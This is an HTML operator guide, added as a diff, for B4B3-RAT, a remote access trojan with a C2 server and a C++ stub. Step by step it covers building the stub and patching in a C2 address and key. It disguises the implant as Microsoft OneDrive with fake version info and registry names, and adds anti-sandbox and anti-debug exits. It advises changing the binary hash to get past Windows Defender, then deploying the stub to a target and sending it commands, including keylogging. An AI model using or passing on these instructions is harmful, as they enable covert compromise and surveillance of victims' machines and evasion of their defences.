@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>B4B3-RAT — Complete Operator Guide</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap');
+
+  :root {
+    --bg:       #0d1117;
+    --surface:  #161b22;
+    --border:   #30363d;
+    --accent:   #00c2a8;
+    --accent2:  #58a6ff;
+    --warn:     #f4a261;
+    --text:     #e6edf3;
+    --muted:    #8b949e;
+    --code-bg:  #1e2530;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    font-size: 15px;
+    line-height: 1.7;
+    padding: 0 0 80px;
+  }
+
+  /* ── Cover ── */
+  .cover {
+    background: linear-gradient(135deg, #0d1117 0%, #0e1f35 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 72px 60px 60px;
+    position: relative;
+    overflow: hidden;
+  }
+  .cover::before {
+    content: '';
+    position: absolute;
+    top: -80px; right: -80px;
+    width: 400px; height: 400px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(0,194,168,.15) 0%, transparent 70%);
+  }
+  .cover .badge {
+    display: inline-block;
+    background: rgba(0,194,168,.12);
+    border: 1px solid rgba(0,194,168,.3);
+    color: var(--accent);
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 2px;
+    padding: 4px 12px;
+    border-radius: 4px;
+    margin-bottom: 20px;
+    text-transform: uppercase;
+  }
+  .cover h1 { font-size: 42px; font-weight: 700; line-height: 1.2; margin-bottom: 14px; }
+  .cover h1 span { color: var(--accent); }
+  .cover .sub { color: var(--muted); font-size: 16px; max-width: 560px; }
+  .cover .meta { margin-top: 36px; display: flex; gap: 32px; flex-wrap: wrap; }
+  .cover .meta-item { }
+  .cover .meta-item .label { font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--muted); margin-bottom: 4px; }
+  .cover .meta-item .value { font-size: 14px; font-weight: 600; color: var(--accent); }
+
+  /* ── TOC ── */
+  .toc-wrap {
+    max-width: 900px; margin: 48px auto; padding: 0 40px;
+  }
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 28px 32px;
+  }
+  .toc h2 { font-size: 13px; text-transform: uppercase; letter-spacing: 2px; color: var(--muted); margin-bottom: 16px; }
+  .toc ol { padding-left: 20px; }
+  .toc li { margin: 6px 0; }
+  .toc a { color: var(--accent2); text-decoration: none; font-size: 14px; }
+  .toc a:hover { text-decoration: underline; }
+  .toc .sub-list { list-style: disc; padding-left: 20px; margin-top: 4px; }
+  .toc .sub-list a { color: var(--muted); font-size: 13px; }
+
+  /* ── Content ── */
+  .content { max-width: 900px; margin: 0 auto; padding: 0 40px; }
+
+  section { margin-bottom: 64px; }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 28px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+  .section-num {
+    background: var(--accent);
+    color: #0d1117;
+    font-size: 13px;
+    font-weight: 700;
+    width: 32px; height: 32px;
+    border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .section-header h2 { font-size: 22px; font-weight: 700; }
+
+  h3 { font-size: 16px; font-weight: 600; color: var(--accent2); margin: 28px 0 10px; }
+  h4 { font-size: 14px; font-weight: 600; color: var(--warn); margin: 20px 0 8px; }
+
+  p { margin-bottom: 12px; color: #c9d1d9; }
+
+  /* ── Code blocks ── */
+  .code-block {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin: 14px 0;
+    overflow: hidden;
+  }
+  .code-block .cb-header {
+    background: rgba(255,255,255,.04);
+    border-bottom: 1px solid var(--border);
+    padding: 8px 16px;
+    font-size: 11px;
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .code-block .cb-header::before {
+    content: '';
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--accent);
+    display: inline-block;
+  }
+  .code-block pre {
+    padding: 16px 18px;
+    overflow-x: auto;
+  }
+  .code-block code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    line-height: 1.6;
+    color: #e6edf3;
+    white-space: pre;
+  }
+  .inline-code {
+    font-family: 'JetBrains Mono', monospace;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    padding: 1px 6px;
+    border-radius: 4px;
+    font-size: 12.5px;
+    color: var(--accent);
+  }
+
+  /* ── Callouts ── */
+  .callout {
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin: 16px 0;
+    font-size: 14px;
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+  }
+  .callout .icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+  .callout-warn  { background: rgba(244,162,97,.1);  border-left: 3px solid var(--warn);  }
+  .callout-info  { background: rgba(88,166,255,.1);  border-left: 3px solid var(--accent2); }
+  .callout-ok    { background: rgba(0,194,168,.1);   border-left: 3px solid var(--accent); }
+
+  /* ── Step list ── */
+  .steps { counter-reset: step; list-style: none; padding: 0; }
+  .steps li {
+    counter-increment: step;
+    padding: 14px 16px 14px 52px;
+    position: relative;
+    border-left: 1px solid var(--border);
+    margin-left: 16px;
+    margin-bottom: 6px;
+  }
+  .steps li::before {
+    content: counter(step);
+    position: absolute;
+    left: -16px;
+    top: 14px;
+    background: var(--surface);
+    border: 2px solid var(--accent);
+    color: var(--accent);
+    width: 32px; height: 32px;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: 700;
+  }
+  .steps li:last-child { border-left-color: transparent; }
+
+  /* ── Table ── */
+  table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 14px; }
+  th { background: var(--surface); color: var(--muted); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; padding: 10px 14px; text-align: left; border-bottom: 2px solid var(--border); }
+  td { padding: 10px 14px; border-bottom: 1px solid var(--border); color: #c9d1d9; }
+  tr:last-child td { border-bottom: none; }
+  td code { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--accent); }
+
+  /* ── Architecture diagram ── */
+  .arch {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 28px;
+    text-align: center;
+    margin: 20px 0;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    line-height: 2;
+    color: var(--muted);
+  }
+  .arch .box {
+    display: inline-block;
+    border: 1px solid;
+    border-radius: 6px;
+    padding: 6px 18px;
+    font-weight: 600;
+    margin: 4px;
+  }
+  .arch .box-green { border-color: var(--accent);  color: var(--accent);  background: rgba(0,194,168,.08); }
+  .arch .box-blue  { border-color: var(--accent2); color: var(--accent2); background: rgba(88,166,255,.08); }
+  .arch .box-warn  { border-color: var(--warn);    color: var(--warn);    background: rgba(244,162,97,.08); }
+  .arch .arrow     { color: var(--border); }
+
+  /* ── Print ── */
+  @media print {
+    body { background: #fff; color: #000; }
+    .cover { background: #f5f5f5; border-bottom: 2px solid #ccc; }
+    .cover h1, .cover h1 span { color: #000; }
+    .cover .sub, .cover .meta-item .label { color: #555; }
+    .cover .meta-item .value { color: #007a6b; }
+    .code-block { background: #f8f8f8; border-color: #ddd; }
+    .code-block code { color: #333; }
+    .section-num { background: #007a6b; }
+    a { color: #007a6b; }
+    section { page-break-inside: avoid; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ═══════════════════════════════ COVER ═══════════════════════════════ -->
+<div class="cover">
+  <div class="badge">Operator Reference</div>
+  <h1>B4B3-RAT <span>C2 Framework</span></h1>
+  <p class="sub">Complete guide — building the stub, configuring the builder, deploying the server, and operating the dashboard.</p>
+  <div class="meta">
+    <div class="meta-item"><div class="label">C2 Server</div><div class="value">Node.js / Express</div></div>
+    <div class="meta-item"><div class="label">Stub</div><div class="value">C++ / MinGW</div></div>
+    <div class="meta-item"><div class="label">Dashboard</div><div class="value">HTML / JS (same-origin)</div></div>
+    <div class="meta-item"><div class="label">Protocol</div><div class="value">HTTP (plain)</div></div>
+    <div class="meta-item"><div class="label">Default Port</div><div class="value">4444</div></div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════ TOC ══════════════════════════════════ -->
+<div class="toc-wrap">
+  <div class="toc">
+    <h2>Contents</h2>
+    <ol>
+      <li><a href="#s1">Architecture Overview</a></li>
+      <li><a href="#s2">Prerequisites</a></li>
+      <li><a href="#s3">Building Stub.exe from Source</a>
+        <ul class="sub-list">
+          <li><a href="#s3-deps">Install dependencies</a></li>
+          <li><a href="#s3-build">Run build.ps1</a></li>
+          <li><a href="#s3-what">What the build produces</a></li>
+        </ul>
+      </li>
+      <li><a href="#s4">Configuring the Stub (Builder)</a></li>
+      <li><a href="#s5">VPS Deployment</a>
+        <ul class="sub-list">
+          <li><a href="#s5-clone">Clone &amp; install</a></li>
+          <li><a href="#s5-env">Environment variables</a></li>
+          <li><a href="#s5-pm2">Start with PM2</a></li>
+          <li><a href="#s5-firewall">Firewall</a></li>
+        </ul>
+      </li>
+      <li><a href="#s6">Dashboard Access</a></li>
+      <li><a href="#s7">Stub Protections Added</a></li>
+      <li><a href="#s8">Full Workflow (End-to-End)</a></li>
+      <li><a href="#s9">Updating the Stub After Code Changes</a></li>
+      <li><a href="#s10">Troubleshooting</a></li>
+    </ol>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════ CONTENT ══════════════════════════════ -->
+<div class="content">
+
+<!-- ─── 1. Architecture ─── -->
+<section id="s1">
+  <div class="section-header">
+    <div class="section-num">1</div>
+    <h2>Architecture Overview</h2>
+  </div>
+
+  <div class="arch">
+    <div><span class="box box-warn">Stub.exe</span> <span class="arrow">──── HTTP ────▶</span> <span class="box box-green">C2 Server :4444</span></div>
+    <div style="margin:8px 0; color:#555;">GET /checkin  GET /cmd  POST /result  POST /upload  POST /event</div>
+    <div><span class="box box-blue">Browser</span> <span class="arrow">──── HTTP ────▶</span> <span class="box box-green">C2 Server :4444</span></div>
+    <div style="margin:8px 0; color:#555;">login.html / index.html / api/auth/* / api/bots/*</div>
+  </div>
+
+  <p>There are three components:</p>
+  <table>
+    <tr><th>Component</th><th>Location</th><th>Role</th></tr>
+    <tr><td><strong>C2 Server</strong></td><td><code>c2-server/</code></td><td>Node.js backend. Receives stub check-ins, stores bot state, serves dashboard files, exposes admin API.</td></tr>
+    <tr><td><strong>Dashboard</strong></td><td><code>c2-dashboard/</code></td><td>Single-page web UI. Served by the C2 server itself (same origin — no CORS needed).</td></tr>
+    <tr><td><strong>Stub</strong></td><td><code>B4B3-RAT/Stub/</code></td><td>C++ agent deployed to target machine. Polls the C2 server over plain HTTP, executes commands, sends results.</td></tr>
+  </table>
+
+  <div class="callout callout-info">
+    <span class="icon">ℹ</span>
+    <span>The stub uses <strong>plain HTTP</strong> (WinInet, no TLS). Do not put TLS certificates on the VPS — if <code>cert.pem</code> and <code>key.pem</code> are present, the server switches to HTTPS and the stub cannot connect.</span>
+  </div>
+</section>
+
+<!-- ─── 2. Prerequisites ─── -->
+<section id="s2">
+  <div class="section-header">
+    <div class="section-num">2</div>
+    <h2>Prerequisites</h2>
+  </div>
+
+  <table>
+    <tr><th>Tool</th><th>Purpose</th><th>Location / Install</th></tr>
+    <tr><td>MinGW-W64 g++ 14+</td><td>Compile the stub</td><td><code>C:\MinGW\bin\g++.exe</code> (already installed)</td></tr>
+    <tr><td>windres</td><td>Compile stub resource file</td><td><code>C:\MinGW\bin\windres.exe</code> (part of MinGW)</td></tr>
+    <tr><td>CryptoPP</td><td>AES encryption in stub</td><td><code>D:\CryptoPP\</code> — headers + <code>libcryptopp.a</code></td></tr>
+    <tr><td>nlohmann/json</td><td>JSON in stub telemetry</td><td><code>B4B3-RAT\packages\nlohmann.json.3.9.1\...</code></td></tr>
+    <tr><td>Node.js 18+</td><td>Run the C2 server</td><td>Install from nodejs.org</td></tr>
+    <tr><td>PM2</td><td>Keep server alive on VPS</td><td><code>npm install -g pm2</code></td></tr>
+  </table>
+</section>
+
+<!-- ─── 3. Building Stub.exe ─── -->
+<section id="s3">
+  <div class="section-header">
+    <div class="section-num">3</div>
+    <h2>Building Stub.exe from Source</h2>
+  </div>
+
+  <p>The stub must be compiled with MinGW whenever you change any <code>.cpp</code> source file. A PowerShell build script handles everything automatically.</p>
+
+  <h3 id="s3-deps">Dependencies (already set up)</h3>
+  <ul style="padding-left:20px; color:#c9d1d9; margin-bottom:12px;">
+    <li>CryptoPP static library at <span class="inline-code">D:\CryptoPP\libcryptopp.a</span></li>
+    <li>nlohmann JSON headers inside the <span class="inline-code">B4B3-RAT\packages\</span> folder</li>
+    <li>MinGW g++ and windres in <span class="inline-code">C:\MinGW\bin\</span></li>
+  </ul>
+
+  <h3 id="s3-build">Running the build</h3>
+  <p>Open PowerShell (any directory) and run:</p>
+
+  <div class="code-block">
+    <div class="cb-header">PowerShell</div>
+    <pre><code>cd "D:\Security related stuff from github\B4DB4B3-RAT-main\B4DB4B3-RAT-main\B4B3-RAT\Stub"
+powershell -ExecutionPolicy Bypass -File build.ps1</code></pre>
+  </div>
+
+  <p>What the script does internally:</p>
+  <ol class="steps">
+    <li>Compiles <span class="inline-code">Stub.rc</span> with <span class="inline-code">windres</span> → <span class="inline-code">Stub_res.o</span> (embeds version info / Microsoft metadata)</li>
+    <li>Compiles all 18 <span class="inline-code">.cpp</span> source files and links everything with <span class="inline-code">g++</span></li>
+    <li>Links CryptoPP, WinInet, GDI+, VFW32, WinMM, IPHlpApi and other Windows libraries</li>
+    <li>Outputs <span class="inline-code">Stub.exe</span> in the same folder and cleans up temp objects</li>
+  </ol>
+
+  <h3 id="s3-what">Output</h3>
+  <div class="code-block">
+    <div class="cb-header">Expected output</div>
+    <pre><code>[1/3] Compiling resource file...
+[2/3] Compiling and linking...
+[3/3] Done — Stub.exe ready.
+Next: Builder reads Stub.exe from this folder — run the Builder and configure it.</code></pre>
+  </div>
+
+  <div class="callout callout-warn">
+    <span class="icon">⚠</span>
+    <span>Warnings like <em>"passing NULL to non-pointer argument"</em> are harmless — they are from the original codebase and do not affect functionality. Only <code>error:</code> lines mean the build failed.</span>
+  </div>
+</section>
+
+<!-- ─── 4. Builder ─── -->
+<section id="s4">
+  <div class="section-header">
+    <div class="section-num">4</div>
+    <h2>Configuring the Stub (Builder)</h2>
+  </div>
+
+  <p>The Builder is a Windows GUI app (<span class="inline-code">B4B3-RAT\Builder\</span>) that patches <span class="inline-code">Stub.exe</span> in-place with your specific C2 settings. It does <strong>not</strong> recompile — it writes config bytes into the binary.</p>
+
+  <h3>Builder fields</h3>
+  <table>
+    <tr><th>Field</th><th>What to enter</th><th>Example</th></tr>
+    <tr><td>C2 Host / BotAPI</td><td>VPS IP address (no http://, no port)</td><td><code>2.24.160.60</code></td></tr>
+    <tr><td>Port</td><td>C2 server port</td><td><code>4444</code></td></tr>
+    <tr><td>Auth Key</td><td>Must match <code>C2_AUTH</code> env var on server</td><td><code>Khan123</code></td></tr>
+    <tr><td>Delay (ms)</td><td>How often stub polls for commands</td><td><code>3000</code></td></tr>
+    <tr><td>Drop Path</td><td>Where stub installs itself on the target</td><td><code>C:\Users\Public\OneDriveHelper.exe</code></td></tr>
+    <tr><td>Autorun name</td><td>Registry autorun value name</td><td><code>OneDriveHelper</code></td></tr>
+  </table>
+
+  <p>After filling all fields, click <strong>Build</strong>. The Builder reads <span class="inline-code">Stub.exe</span> from its own folder, patches the settings block (identified by magic bytes <span class="inline-code">0xDEADBEEF</span>), and writes <span class="inline-code">Stub_configured.exe</span>.</p>
+
+  <div class="callout callout-ok">
+    <span class="icon">✓</span>
+    <span><strong>The auth key must match exactly</strong> on both sides: what you enter in the Builder must equal the <code>C2_AUTH</code> environment variable set when starting the server. Default is <code>changeme</code> — always change it.</span>
+  </div>
+</section>
+
+<!-- ─── 5. VPS Deployment ─── -->
+<section id="s5">
+  <div class="section-header">
+    <div class="section-num">5</div>
+    <h2>VPS Deployment</h2>
+  </div>
+
+  <div class="callout callout-warn">
+    <span class="icon">⚠</span>
+    <span>Do <strong>NOT</strong> place <code>cert.pem</code> or <code>key.pem</code> in the <code>c2-server/</code> folder on the VPS. Their presence switches the server to HTTPS, which the stub cannot connect to (stub uses plain HTTP only).</span>
+  </div>
+
+  <h3 id="s5-clone">1 — Clone and install</h3>
+  <div class="code-block">
+    <div class="cb-header">VPS terminal (SSH)</div>
+    <pre><code>git clone https://github.com/MunibAhmad-dev/B4B3.git
+cd B4B3/c2-server
+npm install</code></pre>
+  </div>
+
+  <h3 id="s5-env">2 — Environment variables</h3>
+  <table>
+    <tr><th>Variable</th><th>Default</th><th>Description</th></tr>
+    <tr><td><code>C2_AUTH</code></td><td><code>changeme</code></td><td>Bot authentication key — must match what is baked into the stub via Builder</td></tr>
+    <tr><td><code>ADMIN_PASS</code></td><td><code>admin123</code></td><td>Dashboard login password</td></tr>
+    <tr><td><code>C2_PORT</code></td><td><code>4444</code></td><td>TCP port the server listens on</td></tr>
+    <tr><td><code>CORS_ORIGIN</code></td><td>(empty)</td><td>Leave empty — dashboard is served by the backend (same origin)</td></tr>
+  </table>
+
+  <h3 id="s5-pm2">3 — Start with PM2</h3>
+  <div class="code-block">
+    <div class="cb-header">VPS terminal</div>
+    <pre><code># Start the server
+C2_AUTH=Khan123 ADMIN_PASS=Khan123456 C2_PORT=4444 \
+  pm2 start server.js --name c2-server
+
+# Save process list so it survives reboots
+pm2 save
+pm2 startup   # follow the printed command to enable boot autostart
+
+# Check status
+pm2 status
+pm2 logs c2-server</code></pre>
+  </div>
+
+  <h3 id="s5-ip">4 — Find your VPS IP</h3>
+  <div class="code-block">
+    <div class="cb-header">VPS terminal</div>
+    <pre><code>curl -4 ifconfig.me    # returns IPv4 address, e.g. 2.24.160.60</code></pre>
+  </div>
+
+  <h3 id="s5-firewall">5 — Open firewall (Hostinger VPS2)</h3>
+  <ol class="steps">
+    <li>Log into Hostinger hPanel → VPS → Firewall</li>
+    <li>Add rule: Protocol <strong>TCP</strong>, Port <strong>4444</strong>, Source <strong>0.0.0.0/0</strong>, Action <strong>Accept</strong></li>
+    <li>Click <strong>Synchronize</strong> — rules are not applied until synchronized</li>
+  </ol>
+</section>
+
+<!-- ─── 6. Dashboard ─── -->
+<section id="s6">
+  <div class="section-header">
+    <div class="section-num">6</div>
+    <h2>Dashboard Access</h2>
+  </div>
+
+  <p>The dashboard is served directly by the C2 server as static files. No separate hosting needed.</p>
+
+  <div class="code-block">
+    <div class="cb-header">Browser</div>
+    <pre><code>http://&lt;VPS-IP&gt;:4444/login.html     # Login page
+http://&lt;VPS-IP&gt;:4444/index.html     # Main dashboard (redirects to login if not authenticated)</code></pre>
+  </div>
+
+  <h3>Dashboard tabs</h3>
+  <table>
+    <tr><th>Tab</th><th>Function</th></tr>
+    <tr><td>Overview</td><td>Bot count, activity graph, recent events</td></tr>
+    <tr><td>Bot Detail → Summary</td><td>System info, send commands, keylogger controls, results</td></tr>
+    <tr><td>Bot Detail → Network</td><td>Active TCP connections from the bot</td></tr>
+    <tr><td>Bot Detail → Persistence</td><td>Registry autorun, scheduled tasks</td></tr>
+    <tr><td>Bot Detail → ATT&amp;CK</td><td>MITRE technique mapping</td></tr>
+    <tr><td>Bot Detail → Detections</td><td>Behavioural detection alerts</td></tr>
+    <tr><td>Bot Detail → Report</td><td>Auto-generated incident report</td></tr>
+    <tr><td>Android</td><td>Android bot management (if applicable)</td></tr>
+    <tr><td>Builder</td><td>Web-based stub configurator</td></tr>
+  </table>
+
+  <div class="callout callout-info">
+    <span class="icon">ℹ</span>
+    <span>Session lasts 8 hours. If you get redirected to login unexpectedly, clear cookies for that origin and log in again.</span>
+  </div>
+</section>
+
+<!-- ─── 7. Protections ─── -->
+<section id="s7">
+  <div class="section-header">
+    <div class="section-num">7</div>
+    <h2>Stub Protections Added</h2>
+  </div>
+
+  <table>
+    <tr><th>Protection</th><th>File</th><th>How it works</th></tr>
+    <tr><td>Version info resource</td><td><code>Stub.rc</code></td><td>Binary reports <em>Microsoft Corporation / Microsoft OneDrive</em> in file properties. Reduces suspicion on static inspection.</td></tr>
+    <tr><td>Registry key renamed</td><td><code>WinMain.cpp</code></td><td>Changed from <code>Software\4B4DB4B3</code> (known signature) to <code>Software\Microsoft\OneDriveSync</code>.</td></tr>
+    <tr><td>Debug files removed</td><td><code>WinMain.cpp</code>, <code>WebcamTool.cpp</code></td><td>Removed writes to <code>C:\Users\Public\stub_dbg.txt</code> and <code>wcam_dbg.txt</code> — both were obvious forensic artefacts.</td></tr>
+    <tr><td>Hypervisor detection</td><td><code>Protector.cpp</code></td><td>Reads CPUID bit 31 at startup. If set, the process is running inside a VM/hypervisor (AV sandbox) → <code>ExitProcess(0)</code>.</td></tr>
+    <tr><td>Sleep acceleration check</td><td><code>Protector.cpp</code></td><td>Sleeps 500 ms and measures elapsed time. AV sandboxes accelerate time to skip delays. If &lt;400 ms elapsed → <code>ExitProcess(0)</code>.</td></tr>
+    <tr><td>Anti-debug checks</td><td><code>Protector.cpp</code></td><td>Existing: <code>IsDebuggerPresent()</code>, <code>CheckRemoteDebuggerPresent()</code>, process name scan (OllyDbg, x64dbg, Wireshark etc.), window title scan.</td></tr>
+    <tr><td>Persistent Bot ID</td><td><code>WinMain.cpp</code></td><td>ID written to registry on first run and reused on restarts — prevents duplicate bot entries when the protector restarts the process.</td></tr>
+  </table>
+</section>
+
+<!-- ─── 8. End-to-End Workflow ─── -->
+<section id="s8">
+  <div class="section-header">
+    <div class="section-num">8</div>
+    <h2>Full Workflow (End-to-End)</h2>
+  </div>
+
+  <ol class="steps">
+    <li><strong>Deploy server on VPS</strong> — clone repo, <code>npm install</code>, start with PM2 using correct env vars. Confirm <code>pm2 status</code> shows it running.</li>
+    <li><strong>Open firewall port 4444</strong> on Hostinger panel → Synchronize.</li>
+    <li><strong>Build Stub.exe</strong> — run <code>build.ps1</code> from <code>B4B3-RAT\Stub\</code>. Produces fresh <code>Stub.exe</code>.</li>
+    <li><strong>Configure stub with Builder</strong> — open Builder GUI, enter VPS IP (no http://), port 4444, auth key, delay, drop path. Click Build → produces <code>Stub_configured.exe</code>.</li>
+    <li><strong>Deploy Stub_configured.exe</strong> to target machine and run it.</li>
+    <li><strong>Open dashboard</strong> at <code>http://&lt;VPS-IP&gt;:4444/login.html</code>, log in with admin password. Bot should appear within one polling interval.</li>
+    <li><strong>Send commands</strong> from the Bot Detail → Summary tab.</li>
+  </ol>
+</section>
+
+<!-- ─── 9. Updating Stub ─── -->
+<section id="s9">
+  <div class="section-header">
+    <div class="section-num">9</div>
+    <h2>Updating the Stub After Code Changes</h2>
+  </div>
+
+  <p>Any time you edit a <code>.cpp</code> or <code>.h</code> file in <code>B4B3-RAT\Stub\</code>:</p>
+
+  <div class="code-block">
+    <div class="cb-header">PowerShell — full rebuild cycle</div>
+    <pre><code># 1. Rebuild
+cd "D:\Security related stuff from github\B4DB4B3-RAT-main\B4DB4B3-RAT-main\B4B3-RAT\Stub"
+powershell -ExecutionPolicy Bypass -File build.ps1
+
+# 2. Open the Builder GUI and click Build again to re-patch the new Stub.exe
+#    The Builder reads Stub.exe from the same folder automatically.
+
+# 3. Distribute the new Stub_configured.exe</code></pre>
+  </div>
+
+  <div class="callout callout-warn">
+    <span class="icon">⚠</span>
+    <span>The C2 server does <strong>not</strong> need to be updated when you rebuild the stub — the stub talks to the server via the same HTTP endpoints regardless of internal changes. Only update the server if you add new routes.</span>
+  </div>
+
+  <h3>Updating the server on VPS after pushing changes</h3>
+  <div class="code-block">
+    <div class="cb-header">VPS terminal</div>
+    <pre><code>cd ~/B4B3/c2-server
+git pull
+npm install          # only if package.json changed
+pm2 restart c2-server</code></pre>
+  </div>
+</section>
+
+<!-- ─── 10. Troubleshooting ─── -->
+<section id="s10">
+  <div class="section-header">
+    <div class="section-num">10</div>
+    <h2>Troubleshooting</h2>
+  </div>
+
+  <table>
+    <tr><th>Symptom</th><th>Cause</th><th>Fix</th></tr>
+    <tr><td>Stub connects but bots duplicate every second</td><td>Old stub uses <code>rand()</code> for ID with no persistence. Protector restarts it → new ID each time.</td><td>Rebuild stub from updated source — ID is now stored in registry.</td></tr>
+    <tr><td>Bot appears in dashboard then immediately disappears</td><td>Server restarted — in-memory state lost.</td><td>Bots reconnect within one poll interval. State is in-memory only; restart clears it.</td></tr>
+    <tr><td>Stub runs but nothing in dashboard</td><td>Auth key mismatch, wrong IP, or firewall blocking port 4444.</td><td>Check Builder auth key == <code>C2_AUTH</code>. Check firewall is synchronized. Try <code>curl http://&lt;VPS-IP&gt;:4444/ping?auth=&lt;key&gt;</code> from terminal.</td></tr>
+    <tr><td>Dashboard login auto-logs out immediately</td><td>Stale HTTPS cookie in browser conflicting with HTTP session.</td><td>Open incognito window or clear cookies for that origin.</td></tr>
+    <tr><td><code>EADDRINUSE :4444</code> on server start</td><td>Previous Node process still running.</td><td><code>pm2 delete c2-server</code> then restart, or <code>fuser -k 4444/tcp</code>.</td></tr>
+    <tr><td>Server switches to HTTPS unexpectedly</td><td><code>cert.pem</code> / <code>key.pem</code> found in <code>c2-server/</code> folder.</td><td>Delete them: <code>rm c2-server/cert.pem c2-server/key.pem</code> and restart.</td></tr>
+    <tr><td><code>Build FAILED</code> — undefined reference</td><td>Missing library in the linker command.</td><td>Check the error for the missing symbol, identify which <code>-l</code> flag covers it, add to <code>build.ps1</code>.</td></tr>
+    <tr><td>Stub killed by Windows Defender immediately</td><td>Binary hash matches known sample (GitHub public repo).</td><td>Rebuild after modifying source code (rename functions, add dummy operations) to produce a different binary hash.</td></tr>
+  </table>
+
+  <h3>Useful quick-check commands</h3>
+  <div class="code-block">
+    <div class="cb-header">VPS — health checks</div>
+    <pre><code># Is the server running?
+pm2 status
+
+# Is port 4444 listening?
+ss -tlnp | grep 4444
+
+# Can the server be reached from outside?
+curl http://&lt;VPS-IP&gt;:4444/ping?auth=Khan123
+
+# Live server logs
+pm2 logs c2-server --lines 50</code></pre>
+  </div>
+</section>
+
+</div><!-- /content -->
+
+<div style="text-align:center; padding:40px; color:#555; font-size:12px; border-top:1px solid #1e2530; margin-top:40px;">
+  B4B3-RAT Operator Guide &nbsp;·&nbsp; For authorized use only
+</div>
+
+</body>
+</html>
